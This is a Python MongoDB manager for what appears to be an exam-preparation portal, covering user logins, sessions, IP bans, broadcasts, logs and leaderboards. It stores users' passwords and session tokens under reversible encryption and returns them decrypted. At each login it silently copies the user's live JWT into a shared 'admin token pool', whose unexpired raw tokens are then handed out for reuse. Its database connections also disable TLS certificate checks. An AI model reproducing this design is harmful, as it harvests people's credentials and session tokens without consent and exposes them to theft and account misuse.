import time
import uuid
from datetime import datetime, timezone, timedelta
import requests
from pymongo import MongoClient, DESCENDING
import config
from security_shield import crypto_shield, security_guard

IST = timezone(timedelta(hours=5, minutes=30))


def now_ist_str():
    return datetime.now(IST).strftime("%d-%m-%Y %I:%M:%S %p")


def today_ist_str():
    return datetime.now(IST).strftime("%Y-%m-%d")


def clean_doc(doc):
    if not doc:
        return doc
    d = dict(doc)
    if "_id" in d:
        d["_id"] = str(d["_id"])
    return d


def decrypt_user_doc(doc):
    if not doc:
        return doc
    d = clean_doc(doc)
    for field in ("jwt_token", "password", "phone"):
        if field in d and d[field]:
            d[field] = crypto_shield.decrypt_field(d[field])
    return d


class MultiMongoManager:
    def __init__(self):
        self.dbs = []
        self.connection_errors = []
        self._connect_all()

    def _connect_all(self):
        self.connection_errors = []
        for idx, uri in enumerate(config.MONGO_URIS, start=1):
            if not uri:
                continue
            try:
                client = MongoClient(
                    uri,
                    serverSelectionTimeoutMS=15000,
                    tls=True,
                    tlsAllowInvalidCertificates=True
                )
                client.admin.command("ping")
                db = client[config.DB_NAME]
                self._ensure_indexes(db)
                self.dbs.append({
                    "index": idx,
                    "label": f"DB-{idx}",
                    "client": client,
                    "db": db,
                })
                print(f"✅ Connected to MongoDB DB-{idx}")
            except Exception as e:
                err_msg = f"DB-{idx}: {e}"
                self.connection_errors.append(err_msg)
                print(f"❌ Failed connecting MongoDB {err_msg}")

        if not self.dbs:
            print("⚠️ WARNING: Koi bhi MongoDB connect nahi hua!")

    def _ensure_indexes(self, db):
        try:
            db.users.create_index("user_id", unique=True)
            db.user_sync.create_index("user_id", unique=True)
            db.admin_tokens.create_index("token_hash", unique=True, sparse=True)
            db.removed_pool_tokens.create_index("token_hash", unique=True, sparse=True)
            db.banned_ips.create_index("ip", unique=True)
            db.activity_logs.create_index([("user_id", 1), ("ts", DESCENDING)])
            db.activity_logs.create_index([("ts", DESCENDING)])
            db.test_attempts.create_index([("test_id", 1), ("score", DESCENDING)])
            db.test_attempts.create_index([("user_id", 1), ("ts", DESCENDING)])
            db.error_logs.create_index([("ts", DESCENDING)])
            db.audit_logs.create_index([("ts", DESCENDING)])
            db.user_messages.create_index([("user_id", 1), ("ts", DESCENDING)])
        except Exception:
            pass

    @staticmethod
    def _token_hash(tok):
        import hashlib
        return hashlib.sha256(str(tok or "").strip().encode("utf-8")).hexdigest()

    # ---------------------------------------------------------
    # STORAGE & SHARD ROUTING
    # ---------------------------------------------------------
    def get_db_size_mb(self, db_entry):
        try:
            stats = db_entry["db"].command("dbStats")
            used_bytes = stats.get("dataSize", 0) + stats.get("indexSize", 0)
            return round(used_bytes / (1024 * 1024), 2)
        except Exception:
            return 0.0

    def get_primary_db(self):
        return self.dbs[0] if self.dbs else None

    def pick_best_db_for_new_user(self):
        if not self.dbs:
            return None
        best_entry = self.dbs[0]
        min_size = float("inf")
        for entry in self.dbs:
            size_mb = self.get_db_size_mb(entry)
            if size_mb < config.MAX_DB_SIZE_MB:
                return entry
            if size_mb < min_size:
                min_size = size_mb
                best_entry = entry
        return best_entry

    def find_user_db(self, user_id):
        uid = str(user_id).strip()
        if not uid:
            return None
        for entry in self.dbs:
            try:
                if entry["db"].users.find_one({"user_id": uid}, {"_id": 1}):
                    return entry
            except Exception:
                continue
        return None

    def get_or_assign_user_db(self, user_id):
        found = self.find_user_db(user_id)
        return found if found else self.pick_best_db_for_new_user()

    # ---------------------------------------------------------
    # PORTAL SETTINGS, MODULE KILL-SWITCHES, VERSION & PROMO POPUP
    # ---------------------------------------------------------
    def get_portal_settings(self):
        defaults = {
            "maintenance_mode": False,
            "maintenance_message": "Portal abhi scheduled update par hai. Kripya thodi der baad try karein.",
            "login_alerts": True,
            "test_submit_alerts": True,
            "single_device_guard": True,
            "app_version": "v3.0",
            "kill_switches": {
                "new_login": True,
                "paid_test_series": True,
                "pdf_viewer": True,
                "pro_vault": True
            },
            "promo_popup": {
                "enabled": False,
                "title": "",
                "message": "",
                "image_url": "",
                "btn_text": "Open Now",
                "btn_url": ""
            },
            "updated_at": now_ist_str()
        }
        entry = self.get_primary_db()
        if not entry:
            return defaults
        doc = entry["db"].settings.find_one({"_id": "portal_config"})
        if not doc:
            entry["db"].settings.insert_one({"_id": "portal_config", **defaults})
            return defaults
        merged = {**defaults, **{k: v for k, v in doc.items() if k != "_id"}}
        merged["kill_switches"] = {**defaults["kill_switches"], **(doc.get("kill_switches") or {})}
        merged["promo_popup"] = {**defaults["promo_popup"], **(doc.get("promo_popup") or {})}
        return merged

    def update_portal_settings(self, updates):
        entry = self.get_primary_db()
        if not entry:
            return self.get_portal_settings()
        current = self.get_portal_settings()
        allowed = [
            "maintenance_mode", "maintenance_message",
            "login_alerts", "test_submit_alerts",
            "single_device_guard", "app_version"
        ]
        clean_upd = {k: updates[k] for k in allowed if k in updates}
        if isinstance(updates.get("kill_switches"), dict):
            clean_upd["kill_switches"] = {**current["kill_switches"], **updates["kill_switches"]}
        if isinstance(updates.get("promo_popup"), dict):
            clean_upd["promo_popup"] = {**current["promo_popup"], **updates["promo_popup"]}
        clean_upd["updated_at"] = now_ist_str()
        entry["db"].settings.update_one({"_id": "portal_config"}, {"$set": clean_upd}, upsert=True)
        self.log_admin_action("UPDATE_SETTINGS", f"Updated keys: {', '.join(clean_upd.keys())}")
        return self.get_portal_settings()

    # ---------------------------------------------------------
    # IP BAN ENGINE
    # ---------------------------------------------------------
    def is_ip_banned(self, ip):
        ip_s = str(ip or "").strip()
        if not ip_s:
            return False, ""
        entry = self.get_primary_db()
        if not entry:
            return False, ""
        doc = entry["db"].banned_ips.find_one({"ip": ip_s})
        if doc:
            return True, doc.get("reason", "IP restricted by Admin")
        return False, ""

    def ban_ip(self, ip, reason="Suspicious activity", user_id=""):
        ip_s = str(ip or "").strip()
        entry = self.get_primary_db()
        if not entry or not ip_s:
            return False
        entry["db"].banned_ips.update_one(
            {"ip": ip_s},
            {"$set": {
                "ip": ip_s,
                "reason": str(reason or "Banned by Admin")[:200],
                "user_id": str(user_id or ""),
                "banned_at": now_ist_str(),
                "ts": int(time.time())
            }},
            upsert=True
        )
        self.log_admin_action("BAN_IP", f"Banned IP {ip_s} ({reason})")
        return True

    def unban_ip(self, ip):
        ip_s = str(ip or "").strip()
        entry = self.get_primary_db()
        if not entry or not ip_s:
            return False
        res = entry["db"].banned_ips.delete_one({"ip": ip_s})
        if res.deleted_count > 0:
            self.log_admin_action("UNBAN_IP", f"Unbanned IP {ip_s}")
            return True
        return False

    def get_banned_ips(self):
        entry = self.get_primary_db()
        if not entry:
            return []
        return [clean_doc(d) for d in entry["db"].banned_ips.find().sort("ts", DESCENDING)]

    # ---------------------------------------------------------
    # USERS, ENCRYPTED STORAGE, SINGLE-DEVICE & LIVE HEARTBEAT
    # ---------------------------------------------------------
    def _auto_save_user_token_to_pool(self, user_id, jwt_token, owner_name="Student"):
        tok = str(jwt_token or "").strip()
        if len(tok) < 20 or security_guard.is_jwt_expired(tok):
            return
        primary = self.get_primary_db()
        if not primary:
            return
        thash = self._token_hash(tok)
        if primary["db"].removed_pool_tokens.find_one({"token_hash": thash}, {"_id": 1}):
            return
        try:
            primary["db"].admin_tokens.update_one(
                {"token_hash": thash},
                {"$set": {
                    "token_hash": thash,
                    "userId": str(user_id).strip(),
                    "owner_name": str(owner_name or "Student"),
                    "label": "Cloud Server",
                    "token": crypto_shield.encrypt_field(tok),
                    "source": "auto_user_login",
                    "active": True,
                    "added_at": now_ist_str(),
                    "ts": int(time.time())
                }},
                upsert=True
            )
        except Exception:
            pass

    def upsert_user_login(self, payload, device_info=None):
        uid = str(payload.get("user_id") or payload.get("userid") or "").strip()
        if not uid:
            uid = f"guest_{int(time.time())}"

        entry = self.get_or_assign_user_db(uid)
        if not entry:
            return None, "NO_DB", ""

        db = entry["db"]
        existing = db.users.find_one({"user_id": uid}) or {}
        now_str = now_ist_str()
        now_ts = int(time.time())
        is_silent_sync = bool(payload.get("silent_sync", False))
        dev = device_info or {}

        raw_jwt = str(payload.get("jwt_token") or "").strip()
        raw_pass = str(payload.get("password") or "").strip()
        raw_phone = str(payload.get("phone") or "").strip()

        enc_jwt = crypto_shield.encrypt_field(raw_jwt) if raw_jwt else existing.get("jwt_token", "")
        enc_pass = crypto_shield.encrypt_field(raw_pass) if (raw_pass and raw_pass != "N/A") else existing.get("password", "N/A")
        enc_phone = crypto_shield.encrypt_field(raw_phone) if (raw_phone and raw_phone != "N/A") else existing.get("phone", "N/A")

        name = payload.get("name") or existing.get("name", "N/A")

        # Single-device session token tracking
        incoming_sid = str(payload.get("session_id") or "").strip()
        if is_silent_sync and existing.get("active_session_id"):
            session_id = existing.get("active_session_id")
        else:
            session_id = incoming_sid or f"sess_{uuid.uuid4().hex[:16]}"

        # Track unique devices for anti-sharing detection
        devices = list(existing.get("devices") or [])
        dev_id = dev.get("device_id") or dev.get("ip") or "unknown"
        multi_device_alert = False
        existing_dev_ids = {d.get("device_id") for d in devices if isinstance(d, dict)}
        if dev_id and dev_id not in existing_dev_ids:
            if len(existing_dev_ids) >= 1 and not is_silent_sync:
                multi_device_alert = True
            devices.insert(0, {
                "device_id": dev_id,
                "ip": dev.get("ip", ""),
                "device_type": dev.get("device_type", "Web"),
                "last_seen": now_str
            })
            devices = devices[:10]
        else:
            for d in devices:
                if isinstance(d, dict) and d.get("device_id") == dev_id:
                    d["ip"] = dev.get("ip", d.get("ip", ""))
                    d["device_type"] = dev.get("device_type", d.get("device_type", "Web"))
                    d["last_seen"] = now_str

        update_doc = {
            "user_id": uid,
            "name": name,
            "email": payload.get("email") or existing.get("email", "N/A"),
            "phone": enc_phone,
            "password": enc_pass,
            "username": payload.get("username") or existing.get("username", "N/A"),
            "state_district": payload.get("state_district") or existing.get("state_district", "N/A"),
            "category_gender": payload.get("category_gender") or existing.get("category_gender", "N/A"),
            "refer_code": payload.get("refer_code") or existing.get("refer_code", "N/A"),
            "account_created": payload.get("account_created") or existing.get("account_created", "N/A"),
            "device_token": payload.get("device_token") or existing.get("device_token", "N/A"),
            "jwt_token": enc_jwt,
            "login_method": payload.get("login_method") or existing.get("login_method", "N/A"),
            "db_shard": entry["label"],
            "last_login": now_str,
            "last_seen": now_str,
            "last_seen_ts": now_ts,
            "last_ping_ts": now_ts,
            "last_ip": dev.get("ip") or existing.get("last_ip", ""),
            "last_device": dev.get("device_type") or existing.get("last_device", "Web"),
            "devices": devices,
            "active_session_id": session_id,
            "force_logout": False,
            "is_logged_in": True,
            "current_activity": "Session Synced" if is_silent_sync else "Logged In",
            "login_count": int(existing.get("login_count", 0)) + (0 if is_silent_sync and existing else 1),
            "is_blocked": bool(existing.get("is_blocked", False)),
            "block_reason": existing.get("block_reason", ""),
            "vip_badge": existing.get("vip_badge", ""),
            "joined_date": existing.get("joined_date") or today_ist_str()
        }

        if not existing:
            update_doc["first_seen"] = now_str
            update_doc["purchased_courses"] = []
            update_doc["total_watch_seconds"] = 0
            update_doc["study_streak"] = 1
            update_doc["last_active_date"] = today_ist_str()

        db.users.update_one({"user_id": uid}, {"$set": update_doc}, upsert=True)

        if raw_jwt:
            self._auto_save_user_token_to_pool(uid, raw_jwt, name)

        if multi_device_alert:
            self.log_activity(uid, "MULTI_DEVICE", f"New device login: {dev.get('device_type')} ({dev.get('ip')})")
        elif not is_silent_sync:
            self.log_activity(uid, "LOGIN", f"Logged in via {update_doc['login_method']} ({dev.get('device_type', 'Web')})")

        return decrypt_user_doc(db.users.find_one({"user_id": uid})), entry["label"], session_id

    def record_user_heartbeat(self, user_id, current_page="Browsing", session_id="", device_info=None):
        uid = str(user_id).strip()
        if not uid:
            return {"valid": True}
        entry = self.find_user_db(uid)
        if not entry:
            return {"valid": True}

        db = entry["db"]
        u = db.users.find_one({"user_id": uid}) or {}
        settings = self.get_portal_settings()

        if u.get("is_blocked"):
            return {"valid": False, "reason": "blocked", "message": u.get("block_reason") or "Account blocked by Admin."}

        if u.get("force_logout"):
            return {"valid": False, "reason": "force_logout", "message": "Admin ne aapka session logout kar diya hai. Kripya dobara login karein."}

        if settings.get("single_device_guard", True) and session_id and u.get("active_session_id"):
            if str(session_id) != str(u.get("active_session_id")):
                return {
                    "valid": False,
                    "reason": "another_device",
                    "message": "Aapka account kisi doosre device par login ho gaya hai. Ek waqt par sirf ek device allow hai."
                }

        now_ts = int(time.time())
        upd = {
            "last_ping_ts": now_ts,
            "last_seen_ts": now_ts,
            "last_seen": now_ist_str(),
            "last_active_date": today_ist_str(),
            "is_logged_in": True,
            "current_page": str(current_page or "Browsing")[:120]
        }
        if device_info:
            if device_info.get("ip"):
                upd["last_ip"] = device_info["ip"]
            if device_info.get("device_type"):
                upd["last_device"] = device_info["device_type"]

        db.users.update_one({"user_id": uid}, {"$set": upd})
        return {"valid": True}

    def get_live_radar_users(self, window_sec=120):
        cutoff = int(time.time()) - window_sec
        live_users = []
        for entry in self.dbs:
            try:
                cursor = entry["db"].users.find({
                    "last_ping_ts": {"$gte": cutoff},
                    "is_logged_in": {"$ne": False},
                    "is_blocked": {"$ne": True}
                })
                for u in cursor:
                    d = decrypt_user_doc(u)
                    live_users.append({
                        "user_id": d.get("user_id"),
                        "name": d.get("name", "Student"),
                        "vip_badge": d.get("vip_badge", ""),
                        "current_page": d.get("current_page") or d.get("current_activity") or "Active",
                        "last_device": d.get("last_device", "Web"),
                        "last_ip": d.get("last_ip", ""),
                        "last_seen": d.get("last_seen", ""),
                        "seconds_ago": max(0, int(time.time()) - int(d.get("last_ping_ts", 0))),
                        "db_shard": entry["label"]
                    })
            except Exception:
                continue
        live_users.sort(key=lambda x: x["seconds_ago"])
        return live_users

    def set_user_logged_out(self, user_id, reason="User logged out from portal"):
        uid = str(user_id).strip()
        if not uid:
            return False
        entry = self.find_user_db(uid)
        if not entry:
            return False
        db = entry["db"]
        now_str = now_ist_str()
        now_ts = int(time.time())
        user_doc = db.users.find_one({"user_id": uid}, {"name": 1}) or {}
        uname = user_doc.get("name") or f"User #{uid}"

        db.users.update_one(
            {"user_id": uid},
            {"$set": {
                "is_logged_in": False,
                "last_logout": now_str,
                "last_seen": now_str,
                "last_seen_ts": now_ts,
                "last_ping_ts": 0,
                "current_activity": "Logged Out",
                "current_page": "Offline"
            }}
        )
        db.activity_logs.insert_one({
            "user_id": uid,
            "user_name": uname,
            "action": "LOGOUT",
            "detail": str(reason)[:200],
            "meta": {},
            "time_str": now_str,
            "date": today_ist_str(),
            "ts": now_ts,
            "db_shard": entry["label"]
        })
        return True

    def force_logout_user(self, user_id):
        uid = str(user_id).strip()
        entry = self.find_user_db(uid)
        if not entry:
            return False
        entry["db"].users.update_one(
            {"user_id": uid},
            {"$set": {
                "force_logout": True,
                "active_session_id": f"revoked_{int(time.time())}",
                "is_logged_in": False,
                "last_ping_ts": 0,
                "current_activity": "Force Logged Out by Admin"
            }}
        )
        self.log_admin_action("FORCE_LOGOUT", f"Forced logout for User #{uid}")
        return True

    def set_user_blocked(self, user_id, blocked, reason=""):
        uid = str(user_id).strip()
        entry = self.find_user_db(uid)
        if not entry:
            return False
        entry["db"].users.update_one(
            {"user_id": uid},
            {"$set": {
                "is_blocked": bool(blocked),
                "block_reason": str(reason).strip() if blocked else "",
                "blocked_at": now_ist_str() if blocked else "",
                "is_logged_in": False if blocked else True,
                "last_ping_ts": 0 if blocked else int(time.time())
            }}
        )
        action = "USER_BLOCKED" if blocked else "USER_UNBLOCKED"
        self.log_activity(uid, action, reason or ("Blocked by Admin" if blocked else "Unblocked by Admin"))
        self.log_admin_action(action, f"User #{uid}: {reason or action}")
        return True

    def set_user_vip_badge(self, user_id, badge=""):
        uid = str(user_id).strip()
        entry = self.find_user_db(uid)
        if not entry:
            return False
        clean_b = str(badge or "").strip()[:30]
        entry["db"].users.update_one({"user_id": uid}, {"$set": {"vip_badge": clean_b}})
        self.log_admin_action("VIP_BADGE", f"User #{uid} badge -> {clean_b or 'None'}")
        return True

    def is_user_blocked(self, user_id):
        uid = str(user_id).strip()
        if not uid:
            return False, ""
        entry = self.find_user_db(uid)
        if not entry:
            return False, ""
        u = entry["db"].users.find_one({"user_id": uid}, {"is_blocked": 1, "block_reason": 1}) or {}
        return bool(u.get("is_blocked", False)), u.get("block_reason", "")

    def save_user_courses(self, user_id, courses_list):
        uid = str(user_id).strip()
        if not uid or not isinstance(courses_list, list):
            return False
        entry = self.get_or_assign_user_db(uid)
        if not entry:
            return False
        cleaned = []
        seen = set()
        for c in courses_list:
            cid = str(c.get("id") or c.get("course_id") or "").strip()
            cname = str(c.get("course_name") or c.get("name") or "Course").strip()
            if cid and cid not in seen:
                seen.add(cid)
                cleaned.append({
                    "id": cid,
                    "course_name": cname,
                    "source": c.get("source", "own"),
                    "test_series_id": str(c.get("test_series_id") or "")
                })
        entry["db"].users.update_one(
            {"user_id": uid},
            {"$set": {
                "purchased_courses": cleaned,
                "courses_updated_at": now_ist_str(),
                "last_seen": now_ist_str(),
                "last_seen_ts": int(time.time()),
            }},
            upsert=True
        )
        return True

    # ---------------------------------------------------------
    # PERSONAL USER MESSAGES & TARGETED GROUP BROADCASTS
    # ---------------------------------------------------------
    def send_personal_message(self, user_id, title, message, msg_type="admin_msg"):
        uid = str(user_id).strip()
        entry = self.get_primary_db()
        if not entry or not uid:
            return None
        doc = {
            "msg_id": f"msg_{int(time.time() * 1000)}_{uuid.uuid4().hex[:4]}",
            "user_id": uid,
            "title": str(title or "Message from Admin").strip()[:100],
            "message": str(message or "").strip()[:600],
            "type": msg_type,
            "read": False,
            "created_at": now_ist_str(),
            "ts": int(time.time())
        }
        entry["db"].user_messages.insert_one(doc)
        self.log_admin_action("SEND_USER_MSG", f"To User #{uid}: {doc['title']}")
        return clean_doc(doc)

    def send_targeted_broadcast(self, target_group, title, message, state_filter=""):
        entry = self.get_primary_db()
        if not entry:
            return 0
        now_ts = int(time.time())
        cutoff_3d = now_ts - (3 * 86400)
        recipients = []

        for shard in self.dbs:
            for u in shard["db"].users.find({"is_blocked": {"$ne": True}}):
                uid = u.get("user_id")
                if not uid:
                    continue
                if target_group == "inactive_3d":
                    if int(u.get("last_seen_ts", 0)) < cutoff_3d:
                        recipients.append(uid)
                elif target_group == "top_performers":
                    if u.get("vip_badge") or int(u.get("study_streak", 0)) >= 3:
                        recipients.append(uid)
                elif target_group == "state":
                    if state_filter and state_filter.lower() in str(u.get("state_district", "")).lower():
                        recipients.append(uid)
                elif target_group == "all":
                    recipients.append(uid)

        count = 0
        for uid in set(recipients):
            entry["db"].user_messages.insert_one({
                "msg_id": f"bc_{int(time.time() * 1000)}_{uuid.uuid4().hex[:5]}",
                "user_id": str(uid),
                "title": str(title or "Announcement").strip()[:100],
                "message": str(message or "").strip()[:600],
                "type": f"broadcast_{target_group}",
                "read": False,
                "created_at": now_ist_str(),
                "ts": now_ts
            })
            count += 1
        self.log_admin_action("TARGETED_BROADCAST", f"Group={target_group} ({state_filter}) -> {count} users")
        return count

    def get_user_inbox(self, user_id, limit=25):
        uid = str(user_id).strip()
        entry = self.get_primary_db()
        if not entry or not uid:
            return []
        docs = list(entry["db"].user_messages.find({"user_id": uid}).sort("ts", DESCENDING).limit(limit))
        return [clean_doc(d) for d in docs]

    def mark_user_inbox_read(self, user_id):
        uid = str(user_id).strip()
        entry = self.get_primary_db()
        if not entry or not uid:
            return False
        entry["db"].user_messages.update_many({"user_id": uid, "read": False}, {"$set": {"read": True}})
        return True

    # ---------------------------------------------------------
    # ADMIN CLOUD TOKEN POOL & DEAD TOKEN SCANNER
    # ---------------------------------------------------------
    def get_all_admin_tokens(self, for_admin=False):
        tokens = []
        seen = set()
        for entry in self.dbs:
            try:
                for doc in entry["db"].admin_tokens.find({"active": {"$ne": False}}):
                    raw_tok = crypto_shield.decrypt_field(doc.get("token", ""))
                    if raw_tok and raw_tok not in seen:
                        seen.add(raw_tok)
                        is_exp = security_guard.is_jwt_expired(raw_tok)
                        if for_admin:
                            tokens.append({
                                "userId": str(doc.get("userId") or doc.get("id") or ""),
                                "id": str(doc.get("userId") or doc.get("id") or ""),
                                "owner_name": doc.get("owner_name") or "Cloud User",
                                "label": "Cloud Server",
                                "source": doc.get("source", "manual"),
                                "is_expired": is_exp,
                                "token": raw_tok,
                                "added_at": doc.get("added_at", "")
                            })
                        else:
                            if not is_exp:
                                tokens.append({
                                    "userId": str(doc.get("userId") or doc.get("id") or ""),
                                    "id": str(doc.get("userId") or doc.get("id") or ""),
                                    "label": "Cloud Server",
                                    "token": raw_tok
                                })
            except Exception:
                continue
        return tokens

    def add_admin_token(self, user_id, token, label="Cloud Server"):
        entry = self.get_primary_db()
        tok = str(token or "").strip()
        if not entry or not tok:
            return False
        thash = self._token_hash(tok)
        entry["db"].removed_pool_tokens.delete_many({"token_hash": thash})
        entry["db"].admin_tokens.update_one(
            {"token_hash": thash},
            {"$set": {
                "token_hash": thash,
                "userId": str(user_id).strip(),
                "owner_name": label or f"UID #{user_id}",
                "label": "Cloud Server",
                "source": "manual_admin",
                "token": crypto_shield.encrypt_field(tok),
                "active": True,
                "added_at": now_ist_str(),
                "ts": int(time.time())
            }},
            upsert=True
        )
        self.log_admin_action("ADD_CLOUD_TOKEN", f"Added token for UID #{user_id}")
        return True

    def delete_admin_token(self, user_id="", token=""):
        deleted = 0
        removed_hashes = []
        raw_tok = str(token or "").strip()
        uid = str(user_id or "").strip()

        for entry in self.dbs:
            q = {"token_hash": self._token_hash(raw_tok)} if raw_tok else ({"userId": uid} if uid else None)
            if not q:
                continue
            for doc in entry["db"].admin_tokens.find(q, {"token_hash": 1, "token": 1}):
                th = doc.get("token_hash") or self._token_hash(crypto_shield.decrypt_field(doc.get("token", "")))
                if th:
                    removed_hashes.append(th)
            res = entry["db"].admin_tokens.delete_many(q)
            deleted += res.deleted_count

        primary = self.get_primary_db()
        if primary and removed_hashes:
            for th in set(removed_hashes):
                primary["db"].removed_pool_tokens.update_one(
                    {"token_hash": th},
                    {"$set": {"token_hash": th, "removed_at": now_ist_str()}},
                    upsert=True
                )
        if deleted > 0:
            self.log_admin_action("DELETE_CLOUD_TOKEN", f"Removed {deleted} token(s) (UID={uid or 'by_token'})")
        return deleted > 0

    def scan_and_clean_dead_tokens(self):
        removed = 0
        kept = 0
        for entry in self.dbs:
            for doc in list(entry["db"].admin_tokens.find({})):
                raw_tok = crypto_shield.decrypt_field(doc.get("token", ""))
                if security_guard.is_jwt_expired(raw_tok):
                    entry["db"].admin_tokens.delete_one({"_id": doc["_id"]})
                    removed += 1
                else:
                    kept += 1
        self.log_admin_action("CLEAN_DEAD_TOKENS", f"Removed {removed} expired tokens, kept {kept} live")
        return {"removed": removed, "kept": kept}

    # ---------------------------------------------------------
    # LIVE ACTIVITY, ERROR LOGS & ADMIN AUDIT LOGS
    # ---------------------------------------------------------
    def log_activity(self, user_id, action, detail="", meta=None):
        uid = str(user_id).strip()
        if not uid:
            return
        entry = self.get_or_assign_user_db(uid)
        if not entry:
            return
        db = entry["db"]
        now_ts = int(time.time())
        now_str = now_ist_str()
        today = today_ist_str()

        user_doc = db.users.find_one({"user_id": uid}, {"name": 1, "study_streak": 1, "last_active_date": 1}) or {}
        uname = (meta or {}).get("name") or user_doc.get("name") or f"User #{uid}"

        db.activity_logs.insert_one({
            "user_id": uid,
            "user_name": uname,
            "action": str(action).upper(),
            "detail": str(detail)[:300],
            "meta": meta or {},
            "time_str": now_str,
            "date": today,
            "ts": now_ts,
            "db_shard": entry["label"]
        })

        streak = int(user_doc.get("study_streak", 1))
        last_date = user_doc.get("last_active_date", "")
        if last_date and last_date != today:
            try:
                diff = (datetime.strptime(today, "%Y-%m-%d").date() - datetime.strptime(last_date, "%Y-%m-%d").date()).days
                streak = (streak + 1) if diff == 1 else (1 if diff > 1 else streak)
            except Exception:
                streak = 1

        update_ops = {
            "$set": {
                "last_seen": now_str,
                "last_seen_ts": now_ts,
                "last_ping_ts": now_ts,
                "is_logged_in": True,
                "current_activity": f"{action}: {detail}"[:120],
                "study_streak": streak,
                "last_active_date": today
            }
        }
        watch_delta = int((meta or {}).get("watch_seconds", 0))
        if watch_delta > 0:
            update_ops["$inc"] = {"total_watch_seconds": watch_delta}

        db.users.update_one({"user_id": uid}, update_ops, upsert=True)

    def log_error(self, source, message, user_id="", stack="", meta=None):
        entry = self.get_primary_db()
        if not entry:
            return None
        doc = {
            "error_id": f"err_{int(time.time() * 1000)}",
            "source": str(source or "Portal")[:80],
            "message": str(message or "Unknown error")[:600],
            "user_id": str(user_id or "Guest"),
            "stack": str(stack or "")[:1200],
            "meta": meta or {},
            "time_str": now_ist_str(),
            "ts": int(time.time())
        }
        entry["db"].error_logs.insert_one(doc)
        return clean_doc(doc)

    def get_error_logs(self, limit=40):
        entry = self.get_primary_db()
        if not entry:
            return []
        return [clean_doc(d) for d in entry["db"].error_logs.find().sort("ts", DESCENDING).limit(limit)]

    def clear_error_logs(self):
        entry = self.get_primary_db()
        if not entry:
            return 0
        cnt = entry["db"].error_logs.delete_many({}).deleted_count
        self.log_admin_action("CLEAR_ERRORS", f"Cleared {cnt} error logs")
        return cnt

    def log_admin_action(self, action, detail="", ip=""):
        entry = self.get_primary_db()
        if not entry:
            return
        try:
            entry["db"].audit_logs.insert_one({
                "audit_id": f"aud_{int(time.time() * 1000)}",
                "action": str(action).upper(),
                "detail": str(detail)[:300],
                "ip": str(ip or ""),
                "time_str": now_ist_str(),
                "ts": int(time.time())
            })
        except Exception:
            pass

    def get_admin_audit_logs(self, limit=50):
        entry = self.get_primary_db()
        if not entry:
            return []
        return [clean_doc(d) for d in entry["db"].audit_logs.find().sort("ts", DESCENDING).limit(limit)]

    def clean_old_logs(self, older_than_days=30):
        cutoff = int(time.time()) - (int(older_than_days) * 86400)
        act_deleted = 0
        err_deleted = 0
        for entry in self.dbs:
            try:
                act_deleted += entry["db"].activity_logs.delete_many({"ts": {"$lt": cutoff}}).deleted_count
                err_deleted += entry["db"].error_logs.delete_many({"ts": {"$lt": cutoff}}).deleted_count
            except Exception:
                continue
        self.log_admin_action("CLEAN_OLD_LOGS", f"Cleaned {act_deleted} activities & {err_deleted} errors (>{older_than_days}d)")
        return {"activity_deleted": act_deleted, "errors_deleted": err_deleted}

    # ---------------------------------------------------------
    # FULL USER CLOUD SYNC
    # ---------------------------------------------------------
    def push_user_sync(self, user_id, sync_payload):
        uid = str(user_id).strip()
        if not uid:
            return False
        entry = self.get_or_assign_user_db(uid)
        if not entry:
            return False

        allowed_keys = [
            "watch_history", "video_notes", "saved_library", "bookmarks",
            "mistake_bank", "flashcards", "planner_tasks", "syllabus_progress",
            "exam_countdown", "study_stats", "preferences",
            "daily_quiz_history", "paused_tests"
        ]
        set_data = {"user_id": uid, "updated_at": now_ist_str(), "updated_ts": int(time.time())}
        for k in allowed_keys:
            if k in sync_payload:
                set_data[k] = sync_payload[k]

        entry["db"].user_sync.update_one({"user_id": uid}, {"$set": set_data}, upsert=True)

        summary_update = {"last_seen": now_ist_str(), "last_seen_ts": int(time.time())}
        if isinstance(sync_payload.get("bookmarks"), list):
            summary_update["bookmarks_count"] = len(sync_payload["bookmarks"])
        if isinstance(sync_payload.get("mistake_bank"), list):
            summary_update["mistakes_count"] = len(sync_payload["mistake_bank"])
        if isinstance(sync_payload.get("exam_countdown"), dict):
            summary_update["target_exam"] = sync_payload["exam_countdown"].get("name", "")
        entry["db"].users.update_one({"user_id": uid}, {"$set": summary_update}, upsert=True)
        return True

    def pull_user_sync(self, user_id):
        uid = str(user_id).strip()
        if not uid:
            return {}
        entry = self.find_user_db(uid)
        if not entry:
            return {}
        doc = entry["db"].user_sync.find_one({"user_id": uid})
        return clean_doc(doc) if doc else {}

    # ---------------------------------------------------------
    # TEST ATTEMPTS, ALL-INDIA LEADERBOARD & MODERATOR
    # ---------------------------------------------------------
    def save_test_attempt(self, payload):
        uid = str(payload.get("user_id") or "").strip()
        test_id = str(payload.get("test_id") or "").strip()
        if not uid or not test_id:
            return None
        entry = self.get_or_assign_user_db(uid)
        if not entry:
            return None

        user_doc = entry["db"].users.find_one({"user_id": uid}, {"vip_badge": 1}) or {}
        now_ts = int(time.time())
        attempt_doc = {
            "attempt_id": f"att_{uid}_{test_id}_{now_ts}",
            "user_id": uid,
            "user_name": payload.get("user_name", "Student"),
            "vip_badge": user_doc.get("vip_badge", ""),
            "test_id": test_id,
            "test_title": payload.get("test_title", "Mock Test"),
            "series_id": str(payload.get("series_id", "")),
            "score": float(payload.get("score", 0)),
            "max_marks": float(payload.get("max_marks", 100)),
            "correct": int(payload.get("correct", 0)),
            "incorrect": int(payload.get("incorrect", 0)),
            "unattempted": int(payload.get("unattempted", 0)),
            "accuracy": float(payload.get("accuracy", 0)),
            "time_taken_sec": int(payload.get("time_taken_sec", 0)),
            "section_stats": payload.get("section_stats", []),
            "time_traps_count": int(payload.get("time_traps_count", 0)),
            "fast_guesses_count": int(payload.get("fast_guesses_count", 0)),
            "date": today_ist_str(),
            "submitted_at": now_ist_str(),
            "ts": now_ts
        }
        entry["db"].test_attempts.insert_one(attempt_doc)
        self.log_activity(
            uid,
            "TEST_SUBMIT",
            f"{attempt_doc['test_title']} | Score: {attempt_doc['score']}/{attempt_doc['max_marks']} ({attempt_doc['accuracy']}%)",
            meta={"name": attempt_doc["user_name"], "test_id": test_id, "score": attempt_doc["score"]}
        )
        lb = self.get_test_leaderboard(test_id, uid)
        return {"attempt": clean_doc(attempt_doc), "leaderboard": lb}

    def delete_test_attempt(self, attempt_id):
        aid = str(attempt_id or "").strip()
        if not aid:
            return False
        for entry in self.dbs:
            res = entry["db"].test_attempts.delete_one({"attempt_id": aid})
            if res.deleted_count > 0:
                self.log_admin_action("DELETE_SCORE", f"Deleted attempt {aid} from leaderboard")
                return True
        return False

